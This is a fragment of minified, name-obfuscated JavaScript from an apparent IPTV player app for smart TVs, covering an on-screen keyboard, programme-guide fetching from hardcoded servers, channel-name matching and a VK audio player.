if(key==VK_DOWN||key==VK_UP){event.preventDefault();if(key==VK_DOWN)kjtYpr.PresearChSelected++;else kjtYpr.PresearChSelected--;kjtYpr.l1O10l10HkBwOllII0Ypr()}else if(key===13){if(kjtYpr.build>=7||1){event.preventDefault();setTimeout("lO0IIlIDUlOllIO0IYpr(VK.focus.value)",150)}}});VK.focus.oninput=function(){console.log("change");if(VK.Mode==0){kjtYpr.PresearChSelected=-1;kjtYpr.l1O10l10HkBwOllII0Ypr();lI0I0QIO10llQlQI1Ypr(VK.focus.value)}}}}catch(e){console.log(e)}};function onkeyb(t){console.log("onkeyb");if(kjtYpr.GL.keyboard=="system"){setTimeout("lO0IIlIDUlOllIO0IYpr(VK.focus.value)",150)}}
VK.enter=function(str){str=str.toString();console.log("VK "+str);if(str.length==1){VKinsert(str);if(VK.shift==1){VK.shift=0;VK.render()}
try{}catch(e){VK.focus.value=str}
console.log("VKE "+VK.focus.value);if(VK.Mode==0)lI0I0QIO10llQlQI1Ypr(VK.focus.value)}else{if(str.indexOf("return.png")>0)str="Close";else if(str.indexOf("clear.png")>0){clearQuick();return}else if(str.indexOf("copy.png")>0){VK.copy=VK.focus.value;copyToClipboard(VK.id);return}else if(str.indexOf("paste.png")>0){var text="";if(kjtYpr.build>=7)text=andr.exec('{"type":"clipboard","mode":"get"}');else if(window.clipboardData)text=window.clipboardData.getData("Text");else if(event.originalEvent&&event.originalEvent.clipboardData)text=event.originalEvent.clipboardData.getData("Text");if(text!="")VKinsert(text);else VKinsert(gV(VK.copy));return}else if(str.indexOf("left.png")>0){setCaretPosition(VK.focus.selectionStart-1);return}else if(str.indexOf("right.png")>0){setCaretPosition(VK.focus.selectionStart+1);return}
switch(str){case "_ST_shift.png":VK.shift=(VK.shift==0)?1:0;VK.render();break;case "_ST_backspace.png":if(VK.focus.value.length>0){VKinsert("-rem-")}
lI0I0QIO10llQlQI1Ypr(VK.focus.value);break;case "_ST_space.png":VKinsert(" ");break;case "_ST_international.png":console.log("switch lang");if(VK.lI0l001QluKXlIl0Ypr[1][0][0]=="q")VK.lI0l001QluKXlIl0Ypr=VK.Kir;else VK.lI0l001QluKXlIl0Ypr=VK.US;VK.render();break;case "_ST_enter.png":lO0IIlIDUlOllIO0IYpr(VK.focus.value);break;case "Shift":VK.shift=(VK.shift==0)?1:0;VK.render();break;case "CLEAR":VK.focus.value="";break;case "Close":returnVK();break;case "Bksp":if(VK.focus.value.length>0)VK.focus.value=VK.focus.value.substr(0,VK.focus.value.length-1);lI0I0QIO10llQlQI1Ypr(VK.focus.value);break;case "Eng":VK.lI0l001QluKXlIl0Ypr=VK.US;VK.render();break;case "Rus":VK.lI0l001QluKXlIl0Ypr=VK.Kir;VK.render();break;case "Enter":lO0IIlIDUlOllIO0IYpr(VK.focus.value);break;default:VK.focus.value+=str;break}}
if(kjtYpr.inputId=="unlockpass"){str=VK.focus.value;if(kjtYpr.GL.passwordkey==str){kjtYpr.Password=str;returnVK();oInset[insetActive].focused();oInset[insetActive].play();if(kjtYpr.Password=="0000")kjtYpr.popUp("_FPViNeSmeniliPassRodKontrRekomendSm_</i>");else kjtYpr.popUp("<i>_FPParolDeistDk_</i>")}}};VK.setpos=function(m){if(VK.last[0]==4){VK.pos[1]=VK.last2[1]}
if(VK.pos[0]<0)VK.pos[0]=VK.lI0l001QluKXlIl0Ypr.length-1;if(VK.pos[1]<0)VK.pos[1]=VK.lI0l001QluKXlIl0Ypr[VK.pos[0]].length-1;if(VK.pos[0]>VK.lI0l001QluKXlIl0Ypr.length-1){VK.pos[0]=0}
if(VK.pos[1]>VK.lI0l001QluKXlIl0Ypr[VK.pos[0]].length-1){if(m)VK.pos[1]=VK.lI0l001QluKXlIl0Ypr[VK.pos[0]].length-1;else VK.pos[1]=0}
for(i in VK.lI0l001QluKXlIl0Ypr){for(j in VK.lI0l001QluKXlIl0Ypr[i]){if(i==VK.pos[0]&&j==VK.pos[1]&&kjtYpr.PresearChSelected==-1){$_("kb"+i+""+j).style.backgroundColor="#2478D0";$_("kb"+i+""+j).style.color="orange"}else{$_("kb"+i+""+j).style.color=f_cols[kjtYpr.GL.color];$_("kb"+i+""+j).style.backgroundColor="#323c42"}}}
VK.last2[0]=VK.last[0];VK.last2[1]=VK.last[1];VK.last[0]=VK.pos[0];VK.last[1]=VK.pos[1]};function lIlI0I111vaIOl00Ypr(){$_("vk").style.display="none";kjtYpr.inputId="";$_("main").style.display="block";$_("player").style.display="none";handler="menu"}
function getJserv(){if(JtvServ==null)return"46.36.220.208";else return JtvServ}
function pushNoEmpty(a,v){if(gV(v)!="")a.push(v);return a}
function lIl1111IIqlINOO10OYpr(page){var xs={},xs2={},ttl="&ttl=",logo="&logo=";if(gV(page.global,"url_tvg")!=""){var tvgmd=md5(page.global.url_tvg).substr(0,7)}else tvgmd="";console.log("tvgmd="+tvgmd);console.log(oInset[insetActive].isLoading);console.log(page);if(page.lIQ0Il1IlIb1Il1OYpr.indexOf("?list=")>0){var tx=unescape(page.lIQ0Il1IlIb1Il1OYpr.split("?list=")[1])}else tx=page.lIQ0Il1IlIb1Il1OYpr;console.log("lIl1111IIqlINOO10OYpr "+tx);var ch=page.channels;for(var index=0;index<ch.length;index++){var cc=[],carr="";ch[index].logo_30x30=gV(ch[index],"logo_30x30");if(gV(ch[index],"stream_url")=="")continue;cc=pushNoEmpty(cc,gV(epg_arr[tx],ch[index].title));if(tvgmd!="")cc=pushNoEmpty(cc,jtvXML(ch[index],tvgmd));cc=pushNoEmpty(cc,l0l11l11O_hCF1I1OlOYpr({"title":ch[index].title,"jtvname":ch[index].jtvname}));if(cc.length){$.each(cc,function(itmp,val){carr=val;if(val.indexOf("xmltv-")==0)xs2[val]=1;else xs[val]=1;if(ch[index].logo_30x30.indexOf("http")!=0){if(val.indexOf("xmltv-")==0){var xf=val.split("-");var chmd5=xf[1];var chid=xf.splice(2).join("-");if(typeof JtvIMxmltv!="undefined"){if(gV(JtvIMxmltv[chmd5],chid)!="")
ch[index].logo_30x30=JtvIMxmltv[chmd5][chid]}}else ch[index].logo_30x30="http://"+getJserv()+"/common/img/"+val+".png"}});ch[index].epg=cc.join(",")}
if(ch[index].logo_30x30=="")ch[index].logo_30x30=""+_img("_ST_1px.png")+"";if(typeof ch[index].yellow!="object")if(gV(ch[index],"catchup")!=""||gV(ch[index],"catchup_days")!=""||gV(curPage.global,"catchup")!=""||gV(curPage.global,"catchup_days")!=""){if(gV(ch[index],"catchup_days")==""){if(gV(curPage.global,"catchup_days")=="")ch[index].catchup_days=3;else ch[index].catchup_days=gV(curPage.global,"catchup_days")}
if(gV(ch[index],"catchup_source")==""){if(gV(curPage.global,"catchup_source")=="")ch[index].catchup_source="";else ch[index].catchup_source=gV(curPage.global,"catchup_source")}
if(gV(ch[index],"catchup")==""){if(gV(curPage.global,"catchup")=="")ch[index].catchup="default";else ch[index].catchup=gV(curPage.global,"catchup")}
if(ch[index].catchup_days>0){var ac={"title":"_FPArchive_","playlist_url":gV(ch[index],"stream_url")+"#archive|"+gV(ch[index],"title")+"|"+carr+"|-"+ch[index].catchup_days+"|"+ch[index].catchup+"|"+ch[index].catchup_source};ac.SetTimeInterval=ch.SetTimeInterval;ch[index].yellow=ac;if(typeof ch[index].menu=="object")ch[index].menu.push(ac);else ch[index].menu=[ac]}}}
var x=objjoin(xs,"-|-");var x2=objjoin(xs2,"-|-");if(x!=""||x2!=""){epg_last=0;if(x!="")epg_src="http://85.17.30.89/common/sip.php?do=apt&type=xhr#POSTget="+x;else epg_src="";if(x2!="")epg_src2="http://exec4.remotecurl.ru/curl/epg.php?do=xmltv&type=xhr&cmd=epg&src="+encodeURIComponent(llIl1I1HlMgNII1IO0Ypr(JtvSRC))+"#POSTget="+x2;else epg_src2="";l0OlO1IvB100I1Ypr()}
if(!oInset[insetActive].isLoading)page.renderChannels(getSelect(),"update")}
function objjoin(o,m){var r="";$.each(o,function(i,v){if(r!="")r+=m;r+=i});return r}
var etst,errepg=0;function jtvXML(ch,md){if(typeof JtvCFxmltv=="undefined"||typeof JtvEFxmltv=="undefined"){loadxmltv()}else if(md!=null){if(gV(JtvEFxmltv[md],ch.jtvname)!="")return"xmltv-"+md+"-"+ch.jtvname;else if(gV(JtvCFxmltv[md],ch.title)!="")return"xmltv-"+md+"-"+JtvCFxmltv[md][ch.title]}
return""}
var chorig="";function l0l11l11O_hCF1I1OlOYpr(ch,n){var point=0;if(typeof JtvC=="undefined"){console.log("epg reload"+"="+errepg);clearTimeout(etst);etst=setTimeout(function(){errepg++;if(errepg<7){lIOI10l0lGIOIl1Ypr("http://85.17.30.89/common/jtv.js?vv=6");lIOI10l0lGIOIl1Ypr("http://46.36.220.208/common/jtv.js?vv=6")}},1900);return""}
if(typeof ch.jtvname=="undefined")ch.jtvname="";if(ch.jtvname!=""){if(typeof JtvE[ch.jtvname]!="undefined")return ch.jtvname;for(j in JtvEF){if(typeof JtvEF[j][ch.jtvname]!="undefined")return ch.jtvname}}
if(typeof JtvC[ch.title]!="undefined")return JtvC[ch.title];else if(typeof JtvE[ch.title]!="undefined")return ch.title;else if(n==null){chorig=l0QO11lOz0bfh10l0Ypr(llIl1I1HlMgNII1IO0Ypr(ch));ch.title=ch.title.toLowerCase();try{ch.title=ch.title.trim()}catch(e){}
return l0l11l11O_hCF1I1OlOYpr(ch,1)}else if(n==++point){return l0l11l11O_hCF1I1OlOYpr(ch,++n)}else if(n==++point){ch.title=ch.title.replace(" 1000","1000");return l0l11l11O_hCF1I1OlOYpr(ch,++n)}else if(n==++point){ch.title=ch.title.replace(" and ","+");return l0l11l11O_hCF1I1OlOYpr(ch,++n)}else if(n==++point){ch.title=ch.title.replace("hd","");ch.title=ch.title.replace("sd","");try{ch.title=ch.title.trim()}catch(e){}
return l0l11l11O_hCF1I1OlOYpr(ch,++n)}else if(n==++point){return l0l11l11O_hCF1I1OlOYpr(ch,++n)}else if(n==++point){ch.title=ch.title+" (россия)";return l0l11l11O_hCF1I1OlOYpr(ch,++n)}else if(n==++point){ch.title=ch.title.replace(" (россия)","");return l0l11l11O_hCF1I1OlOYpr(ch,++n)}else if(n==++point){ch.title=ch.title+" россия";return l0l11l11O_hCF1I1OlOYpr(ch,++n)}else if(n==++point){ch.title=ch.title.replace(" россия","");return l0l11l11O_hCF1I1OlOYpr(ch,++n)}else if(n==++point){ch.title=ch.title+" hd";return l0l11l11O_hCF1I1OlOYpr(ch,++n)}else if(n==++point){ch.title=ch.title.replace(" hd","");return l0l11l11O_hCF1I1OlOYpr(ch,++n)}else if(n==++point){ch.title=ch.title.replace(" i"," 1");return l0l11l11O_hCF1I1OlOYpr(ch,++n)}else if(n==++point){ch.title=ch.title.replace(" ii","2");return l0l11l11O_hCF1I1OlOYpr(ch,++n)}else if(n==++point){ch.title=ch.title.replace("інтер","интер").replace("iнтер","интер");ch.title=ch.title.replace("(ua)","");ch.title=ch.title.replace("(en)","");ch.title=ch.title.replace("(fr)","");ch.title=ch.title.replace("Divan ","");ch.title=ch.title.replace("music box","musicbox");ch.title=ch.title.replace("2x2","2х2");try{ch.title=ch.title.trim()}catch(e){}
return l0l11l11O_hCF1I1OlOYpr(ch,++n)}else if(n==++point){ch.title=ch.title.replace(/_/g," ");return l0l11l11O_hCF1I1OlOYpr(ch,++n)}else if(n==++point){ch.title=ch.title.replace(/ /g,"");return l0l11l11O_hCF1I1OlOYpr(ch,++n)}else if(n==++point){ch.title=ch.title+" ru";return l0l11l11O_hCF1I1OlOYpr(ch,++n)}else if(n==++point){ch.title=ch.title.replace(" ru"," ua");return l0l11l11O_hCF1I1OlOYpr(ch,++n)}else if(n==++point){ch.title=ch.title.replace(" ua","");ch.title=ch.title.replace("1"," 1").replace("2"," 2").replace("3"," 3");return l0l11l11O_hCF1I1OlOYpr(ch,++n)}else if(n==++point){ch.title=ch.title.replace("tv","");try{ch.title=ch.title.trim()}catch(e){}
return l0l11l11O_hCF1I1OlOYpr(ch,++n)}else if(n==++point){ch.title=ch.title.replace(".","");return l0l11l11O_hCF1I1OlOYpr(ch,++n)}else if(n==++point){ch.title=ch.title.replace(/\(.*?\)/,"");return l0l11l11O_hCF1I1OlOYpr(ch,++n)}else{for(j in JtvEF){if(typeof JtvEF[j][chorig.title]!="undefined")return chorig.title}
var s=chorig.title.toLowerCase();for(j in JtvCF){if(typeof JtvCF[j][s]!="undefined")return JtvCF[j][s]}
return""}}
function dt(sec,b,b2,b3,offc){sec=parseInt(sec);if(offc==null)sec+=(parseInt(kjtYpr.GL.JTVRegion)+T.offset/60)*3600;var date=new Date(sec*1000);var hours="0"+date.getHours();var minutes="0"+date.getMinutes();var d="0"+date.getDate();var m="0"+(1+date.getMonth());if(b)s=d.substr(d.length-2)+'.'+m.substr(m.length-2);else s="";if(b3)s+="."+date.getFullYear();if(b2)ss2=':'+("0"+(sec%60)).substr(("0"+(sec%60)).length-2);else ss2="";return s+" "+hours.substr(hours.length-2)+':'+minutes.substr(minutes.length-2)+ss2}
var prog_timer,epg_ch_full={},lllllllI0hvKh11IIIYpr_last=0;function lllllllI0hvKh11IIIYpr(ch){if(ch==null)ch=curCh();if(T.inetTime-lllllllI0hvKh11IIIYpr_last<1800000||typeof ch.epg=="undefined")return;console.log("lllllllI0hvKh11IIIYpr "+ch.epg);lllllllI0hvKh11IIIYpr_last=T.inetTime;clearTimeout(prog_timer);var e=ch.epg;prog_timer=setTimeout(function(){if(handler=="menu"||handler=="player"||handler=="qual"){console.log("prog timer epg 1");if(!modeGroup&&typeof e!="undefined"&&typeof epg_ch[e]!="undefined"&&typeof epg_ch_full[e]=="undefined"){console.log("prog timer epg 2");if(e.indexOf("xmltv-")==0)var u="http://exec4.remotecurl.ru/curl/epg.php?do=xmltv&cmd=epg&src="+encodeURIComponent(llIl1I1HlMgNII1IO0Ypr(JtvSRC))+"&mode=full&get="+e;else u="http://85.17.30.89/common/sip.php?do=full&get="+e;xhrt=new XMLHttpRequest();ch.description+="<center><img id='bloading' src='"+_img("_ST_b_loading.gif")+"' width=15 /></center>";if(handler!="vk")lI1I1IxFCIh1l01llYpr("infoList",ch.description);xhrt.onreadystatechange=function(){if(xhrt.readyState==4){try{$_("bloading").style.display="none"}catch(e){}
var m=l0QO11lOz0bfh10l0Ypr(xhrt.responseText);if(m!=null){if(typeof m[e]=="object"){epg_ch[e]=m[e];epg_ch_full[e]=m[e];console.log(epg_ch_full[e]);if(e==ch.epg){nj="";ch.description=ch.title+"<br>";while(typeof epg_ch_full[e]["title"+nj]!="undefined"){ch.description+="<span style='color:rgb(197, 157, 157);'>"+dt(epg_ch_full[e]["start"+nj])+" - "+dt(epg_ch_full[e]["end"+nj])+"</span> "+epg_ch_full[e]["title"+nj]+"<br>";if(nj=="")nj=2;else nj++}
ch.description+="<div style='position:absolute;top:0px;width:98%;font-size:60%;text-align:right;vertical-align:top;'><span style='color:rgb(197, 157, 157);vertical-align:top;'>"+ch.epg+"</style> <img align='right' width="+css_w(24)+" src='"+_img(ch.logo_30x30)+"' /></div>";if(handler!="vk")lI1I1IxFCIh1l01llYpr("infoList",ch.description)}}}}};xhrt.open('GET',u,!0);xhrt.send();console.log("full "+u)}}},5000)}
function jsc_142427789(obj,timer){console.log(obj);var eup=!1;if(obj==null)var et=!0;else et=!1;if(obj!=null){if(epg_ch!=null){for(var j in obj)epg_ch[j]=obj[j]}else epg_ch=obj}else if(epg_ch!=null)obj=epg_ch;else return;if(timer==null)epg_timer=setTimeout("epg_ch['now']=parseInt(epg_ch['now'])+60;jsc_142427789();",60000);page=IlIOIO()||gP();epg_time=obj.now;console.log("epg loaded "+epg_time);for(var i=0;i<page.channels.length;i++){var e1=gV(page.channels[i],"epg").split(",");$.each(e1,function(index,e){if(e!=""&&typeof obj[e]!="undefined"){if(typeof epg_ch_full[e]!="undefined")obj[e]=epg_ch_full[e];page.channels[i].description=page.channels[i].title+"<br>";try{var w=0;while(epg_time>obj[e].end&&typeof obj[e].title2!="undefined"){var nj="",nk=2;while(typeof obj[e]["title"+nj]!="undefined"){if(nj!="")nk=nj+1;obj[e]["title"+nj]=obj[e]["title"+nk];obj[e]["start"+nj]=obj[e]["start"+nk];obj[e]["end"+nj]=obj[e]["end"+nk];nj=nk}}
w=Math.ceil(((epg_time-obj[e].start)/(obj[e].end-obj[e].start))*100);var t=Math.ceil((obj[e].end-epg_time)/60);if(t>=0){t="+"+t}else if(et){eup=!0}}catch(e){}
nj="";while(typeof obj[e]["title"+nj]!="undefined"){page.channels[i].description+="<span style='color:rgb(197, 157, 157);'>"+dt(obj[e]["start"+nj])+" - "+dt(obj[e]["end"+nj])+"</span> "+obj[e]["title"+nj]+"<br>";if(nj=="")nj=2;else nj++}
page.channels[i].description+="<div style='position:absolute;top:0px;width:98%;font-size:60%;text-align:right;vertical-align:top;'><span style='color:rgb(197, 157, 157);vertical-align:top;'>"+page.channels[i].epg+"</style> <img align='right' width="+css_w(24)+" src='"+_img(page.channels[i].logo_30x30)+"' /></div>";page.channels[i].epgnow={"title":obj[e].title,"time":t,"cur":w}}})}
if(T.inetTime-epg_last>3600000){l0OlO1IvB100I1Ypr();eup=0}
page.epgAppend();oInset[insetActive].focused();if(handler=="menu"&&!modeGroup){if(eup)l0OlO1IvB100I1Ypr()}
if(handler=="group"||modeGroup){}}
function l0OlO1IvB100I1Ypr(){if(T.inetTime-epg_last<60000&&T.inetTime>0){console.log(T.inetTime+"-"+epg_last);return}
epg_last=T.inetTime;clearTimeout(epg_timer);console.log("epg load");if(epg_src!="")l0OlO1IvB100I1Ypr_src(epg_src);if(epg_src2!="")l0OlO1IvB100I1Ypr_src(epg_src2)}
function l0OlO1IvB100I1Ypr_src(u){xhr=uHelper.create("directnoheader").hid().get(u).parse=function(s){if(s==null){statusbar("Error get EPG "+u,"text")}else if(s.indexOf("{")==-1){console.log(s)}else{try{var x=l0QO11lOz0bfh10l0Ypr(s);if(x!=null)jsc_142427789(x);else statusbar("Error format EPG "+s.substr(0,30),"text")}catch(e){statusbar(s.substr(0,140))}}}}
function l0I1lljnfqdllllOIYpr(){try{if(kjtYpr.GL.vk_id==""||kjtYpr.GL.vk_token=="")return;$_("vk_audio").style.display="none"}catch(e){}}
var vk_autostart=!0;function l0I1l1I10bl1F10lIOIYpr(mode){if(((kjtYpr.GL.vk_id==""||kjtYpr.GL.vk_token=="")&&kjtYpr.l1O0l1gmmv01O11Ypr("vk_pl_url").indexOf("http")==-1)||kjtYpr.GL.audioplayer<1)return;if(vk_audio_pl.length<1){var s=kjtYpr.l1O0l1gmmv01O11Ypr("vk_audio_pl");if(s!=""){vk_audio_pl=l0QO11lOz0bfh10l0Ypr(s)}
s=kjtYpr.l1O0l1gmmv01O11Ypr("vk_audio_sel");if(s!=""){vk_audio_sel=parseInt(s)}}
console.log("l0I1l1I10bl1F10lIOIYpr");if(vk_audio_pl.length<1){l0I110IO1SyqII1lI1Ypr=!1;return}else l0I110IO1SyqII1lI1Ypr=!0;getwh();if($_("vk_audio")!=null)$_("vk_audio").style.display="block";else{var div=document.createElement('div');div.id='vk_audio';div.style.position="absolute";div.style.backgroundColor="rgb(89, 117, 181)";div.style.padding="2px 4px";div.style.borderRadius="5px";div.style.display="block";div.style.fontSize=css_wh(18)+"px";div.style.width="300px";div.style.height="85px";document.getElementsByTagName('body')[0].appendChild(div)}
$_("vk_audio").style.top=(innerH-90)+"px";$_("vk_audio").style.left=(innerW-330)+"px";lI1I1IxFCIh1l01llYpr("vk_audio","<div id='audiotitle' style='height:"+css_wh(43)+"px;overflow:hidden;color:black;width:100%;'>"+vk_audio_pl[vk_audio_sel].description+"</div>"+"<div style='position:absolute;top:2px;left:"+css_w(218)+"px;height:"+css_wh(10)+"px; width: "+css_w(70)+"px;  text-align: right;'>"+(parseInt(vk_audio_sel)+1)+"/"+vk_audio_pl.length+"</div>"+"<div id='rtma' style='position:absolute;  top: "+css_wh(62)+"px;  left: "+css_w(250)+"px;  width: "+css_w(50)+"px;  text-align: right;  height: "+css_wh(10)+"px;  font-size: "+css_wh(14)+"px;  color: #F8F9F6;'></div>"+"<div onclick=\"keyHandler({'keycode':VK_STOP});\" title='Закрыть / Кнопка СТОП' style='position:absolute;top:0px;left:"+css_w(292)+"px;height:"+css_wh(10)+"px;color:rgb(205, 30, 30);'>x</div>"+"<div id='vk_audio_bar' style='float:left;position:relative;top:"+css_wh(5)+"px;left:2px;height:"+css_wh(10)+"px;width:"+css_w(296)+"px;background-color:#a0b9d6;border-radius:3px;'><div id='vk_audio_pos' style='float:left;position:relative;left:2px;height:6px;top:2px;width:0px;background-color:#5885b8;'></div></div>"+"<ul style='padding-left: "+css_w(60)+"px;'>"+"<li onclick=\"keyHandler({'keycode':VK_REWIND})\" style='background-position: 0px -105px;display: inline-block;background-image:url("+_img("_ST_audio_controls.png")+");width:30px;height:35px;'></li>"+"<li onclick=\"keyHandler({'keycode':VK_PAUSE})\" style='background-position: 0px -38px;display: inline-block;background-image:url("+_img("_ST_audio_controls.png")+");width:30px;height:35px;'></li>"+"<li onclick=\"keyHandler({'keycode':VK_PLAY});\" style='background-position: 0px -3px;display: inline-block;background-image:url("+_img("_ST_audio_controls.png")+");width:30px;height:35px;'></li>"+"<li onclick=\"keyHandler({'keycode':VK_FAST_FWD})\" style='background-position: 0px -138px;display: inline-block;background-image:url("+_img("_ST_audio_controls.png")+");width:30px;height:35px;'></li>"+"<li id='vkr' title='Повтор' onclick=\"vk_audioRepeat(true);\" style='background-position: 0px -174px;display: inline-block;background-image:url("+_img("_ST_audio_controls.png")+");width:30px;height:35px;'></li>"+"<li title='Перемешать' onclick=\"vk_audioShuffle();\" style='background-position: 0px -73px;display: inline-block;background-image:url("+_img("_ST_audio_controls.png")+");width:30px;height:35px;'></li>"+"</ul>");$_('vk_audio_bar').onclick=function(e){curTime=getCur();totalTime=getTotal();if(totalTime>0){var BarWidth=css_w(296);var x=e.pageX-$(this).offset().left;if(platform=="sams"){var a=(x/BarWidth)*Player.total_time;if(a>Player.cur_time)lIl0I1O0Iab1I10Ypr(a-Player.cur_time);else lI1llO1QIebXl10lO1Ypr(a-Player.cur_time);console.log("move click"+(a-Player.cur_time))}else if(lIO1OIOlAQzl1Ol1lYpr=="media"||lIO1OIOlAQzl1Ol1lYpr=="ext"){media.seek((x/BarWidth)*media.playTime)}else{video.currentTime=(x/BarWidth)*video.duration}}};if(mode=="autostart"){setTimeout('$_("vk_audio").style.zIndex="-2";$_("vk_audio").style.display="none";$_("vk_play_button").style.display="block";',1500)}
vk_audioRepeat()}
function vk_audioRepeat(m){if(m){vk_repeat=!vk_repeat;if(vk_repeat)kjtYpr.inf("Повтор: включен!",1000);else kjtYpr.inf("Повтор: отключен!",1000)}
if(vk_repeat)$_("vkr").style.backgroundPosition="33px -174px";else $_("vkr").style.backgroundPosition="0px -174px"}
function vk_Visualaudio(n){try{console.log("vk_Visualaudio "+vk_visual);if(vk_visual){lI1I1IxFCIh1l01llYpr("jw","<div style='z-index:1;width:100%;height:100%;background-color:black;'>"+"<img style='width:100%;height:100%;' src='"+_img("_ST_visual"+n+".gif")+"' />"+"</div>");$_("jw").style.display="block";$_("jw").style.zIndex="1"}else{lI1I1IxFCIh1l01llYpr("jw","");$_("jw").style.zIndex="0";$_("jw").style.display="none"}}catch(e){kjtYpr.popUp(e.message)}}
function vk_audioShuffle(){kjtYpr.inf("Перемешано!",1000);vk_audio_pl=shuffle(vk_audio_pl)}
function shuffle(array){for(var j,x,i=array.length;i;j=parseInt(Math.random()*i),x=array[--i],array[i]=array[j],array[j]=x);return array}
function l0lOIIIIItWYQ01I0IYpr(){try{if(l0I110IO1SyqII1lI1Ypr){if($_("vk_audio").style.display=="block")return!0;else return!1}}catch(e){return!1}}
function vk_audio_stop(){stopped=!0;if(uaJ=="dune"){stb.stop()}else if(uaJ=="mag"){stb.Stop()}else if(platform=="sams")samsStop();else if(lIO1OIOlAQzl1Ol1lYpr=="html5"||lIO1OIOlAQzl1Ol1lYpr=="ifrhtml5"){}else{lI1I1IxFCIh1l01llYpr("jw","");lI1I1IxFCIh1l01llYpr("other","")}}
function l1O010LAAOlI1IIYpr(pl,sel){if(pl!=null){console.log(pl);var curPage=gP();vk_autostart=!1;vk_audio_pl=[];for(var i=0;i<pl.length;i++){pl[i].stream_url=gV(pl[i],"stream_url").replace("audio://","");if(is_audio(pl[i].stream_url)){pl[i].description=oInset[insetActive].get("title").replace(/<.*?>/g,"")+"<br><span style='font-size:16px;color:#EEE;'>"+pl[i].title.replace(/<.*?>/g,"").substr(0,38)+"</span>";vk_audio_pl.push(pl[i])}else{if(i<sel)sel--}}
kjtYpr.lll0Il11OxICbl1ll0Ypr("vk_pl_url",curPage.lIQ0Il1IlIb1Il1OYpr)}
if(sel!=null)vk_audio_sel=sel;if(vk_audio_sel>vk_audio_pl.length-1)vk_audio_sel=0;else if(vk_audio_sel<0)vk_audio_sel=vk_audio_pl.length-1;if(vk_autostart){var s=kjtYpr.l1O0l1gmmv01O11Ypr("vk_pl_url");if(s!=""&&s.indexOf("http")==-1){vk_cmd="get_audio";vk_open(s,vk_autostart);return}}
console.log(vk_audio_pl);console.log(vk_audio_sel);var u=vk_audio_pl[vk_audio_sel].stream_url.replace("audio://","");console.log(u);if(u.indexOf("md5hash")!=-1){is_loadpage(1);lI1I1IxFCIh1l01llYpr("audiotitle","_FPZagruzka_...");xhr2=new XMLHttpRequest();xhr2.onreadystatechange=function(){if(xhr2.readyState==4){if(xhr2.status==200){vk_audio_pl[vk_audio_sel].stream_url=vk_audio_pl[vk_audio_sel].stream_url.replace("md5hash",xhr2.responseText);l1O010LAAOlI1IIYpr(null,sel)}else lI1I1IxFCIh1l01llYpr("audiotitle","_FPOshibka_ "+xhr2.status+"")}};xhr2.open('GET',vk_audio_pl[vk_audio_sel].parser.split("|")[0].replace("//obovse.ru","//"+lIOO01vuII1IQIYpr),!0);xhr2.send();return}
if(u.indexOf("error.")>0){kjtYpr.inf("_FPOshibka_ "+u.replace("&okhash.mp3","")+" - "+vk_audio_pl[vk_audio_sel].title,1500);if(l0I110IO1SyqII1lI1Ypr)setTimeout('l1O010LAAOlI1IIYpr(vk_audio_pl,++vk_audio_sel);',2000);return}
console.log("play:"+u);l0I110IO1SyqII1lI1Ypr=!0;if(!stopped){vk_audio_stop()}
stopped=!1;end_ok=!1;if(platform=="sams"){if(Player.Sef){Player.SEFPlay(u,0)}else if(kjtYpr.series=="C"){Player.plugin.Play(u)}else{Player.plugin.InitPlayer(u);Player.plugin.SetPlayerProperty('2','0','0');Player.plugin.StartPlayback()}}else{lIO1OIOlAQzl1Ol1lYpr=kjtYpr.GL.player;var a=kjtYpr.GL.audioplayer;if(platform=="android-device")lIO1OIOlAQzl1Ol1lYpr="html5";if(uaJ=="mag"){stb.Play(u);stb.SetPIG(1,0,0,0);try{stb.SetWinMode(0)}catch(e){}
try{stb.SetTopWin(0)}catch(e){}}else if(uaJ=="dune"){stb.play(u)}else if(platform=="tizen"){try{webapis.avplay.stop();webapis.avplay.open(u)}catch(e){kjtYpr.popUp("Error 1<br>"+u+"<br>"+e.message,4000)}
try{webapis.avplay.setListener({oncurrentplaytime:function(currentTime){Player.cur_time=currentTime;getVideoPlayInfo()},ondrmevent:function(e,f){},onerror:function(e,f){}});webapis.avplay.prepareAsync(function(e){webapis.avplay.play();getVideoPlayInfo()},function(e){l1llOQI10lW1l_II101Ypr();kjtYpr.popUp(e.toString(),2500)})}catch(e){kjtYpr.popUp(e.toString(),2500)}}else if(a==1||a==2||a==4){if(a!=4&&(a==2||lIO1OIOlAQzl1Ol1lYpr=="html5"||lIO1OIOlAQzl1Ol1lYpr=="ifrhtml5"||lIO1OIOlAQzl1Ol1lYpr=="jw")){lIO1OIOlAQzl1Ol1lYpr="html5";$_("other").style.display="block";lI1I1IxFCIh1l01llYpr("other",'<audio id="audio" autoplay="autoplay" src="'+u+'"></audio>');video=$_("audio")}else{$_("other").style.display="block";type="video/mp4";lI1I1IxFCIh1l01llYpr("other",'<object type="'+type+'" preBufferingTime="8" audioLanguage="ru" data="'+u+'" width="100%" height="100%" id="media" autostart="true" downloadable="false"></object>');media=$_("media");setTimeout("media.play(1);",200)}}else if(a==3){video=$_("video");video.src=u;if(uaJ=="lg"||uaJ=="lgw"||uaJ=="lgw2")video.type="video/mp4";else video.type="audio/mpeg";video.autoplay=!0;video.play()}}
l0I1l1I10bl1F10lIOIYpr();$_("vk_audio").style.zIndex="2";kjtYpr.lll0Il11OxICbl1ll0Ypr("vk_audio_pl",llIl1I1HlMgNII1IO0Ypr(vk_audio_pl));kjtYpr.lll0Il11OxICbl1ll0Ypr("vk_audio_sel",vk_audio_sel)}
function l1ll1Ol00ecDAI10llYpr(sec){m=Math.floor(sec/60);h=Math.floor(m/60);m=m%60;s=sec%60;if(m<10)m="0"+m;if(s<10)s="0"+s;return h+":"+m+":"+s}
var xhrz;var xss="",alls="",wint_name="";function sefOnEvent(m,s){alls+=s+"|";kjtYpr.popUp(s);var FilePlugin=$_('pluginObjectFileSystem');name=wint_name;try{var fileSystemObj=new FileSystem();var len="";var arrFiles=fileSystemObj.readDir('/mtd_rwcommon/common');for(var i=2;i<arrFiles.length;i++){if(arrFiles[i].name==name+".zip"){len=ToSize(arrFiles[i].size)}}}catch(e){}
